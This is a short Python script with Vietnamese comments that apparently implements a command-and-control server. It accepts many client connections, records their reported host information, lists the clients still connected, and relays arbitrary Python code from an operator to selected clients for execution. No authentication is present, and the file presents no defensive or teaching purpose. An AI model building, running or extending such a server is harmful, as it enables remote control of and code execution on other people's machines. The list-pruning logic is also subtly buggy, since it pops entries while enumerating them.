import socket
import json


sever_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sever_socket.bind(('0.0.0.0', 12345))

sever_socket.listen(100)


info_clients = []
clients = []


while True:
    client_socket, client_address = sever_socket.accept()
    client_id = f'{client_address[0]}'#:{client_address[1]}'
    
    
    data = client_socket.recv(1024).decode()
    json_data = json.loads(data)
    
    
    if json_data['cmd'] == 'add':
        clients.append(client_socket)
        info_clients.append(json_data['result'])
        print('Client connected:', client_id)
        print('Info:', json_data['result'])
        print('Total clients:', len(clients))
        
        
    if json_data['cmd'] == 'ls_clients':
        # lấy danh sách client còn kết nối
        for i, client in enumerate(clients):
            try:
                client.sendall(json.dumps({
                    'cmd': 'ping'
                }).encode())
            except:
                clients.pop(i)
                info_clients.pop(i)
            
        # gửi danh sách client còn kết nối
        client_socket.sendall(json.dumps({
            'cmd': 'ls_clients',
            'result': info_clients
        }).encode())
        
        
        
        
        
        
    if json_data['cmd'] == 'python':
        client_run = json_data['clients']
        for client_id in client_run:
            try:
                clients[client_id].sendall(json.dumps({
                    'cmd': 'python',
                    'code': json_data['code']
                }).encode())
            except:
                pass
    
    
    
    
    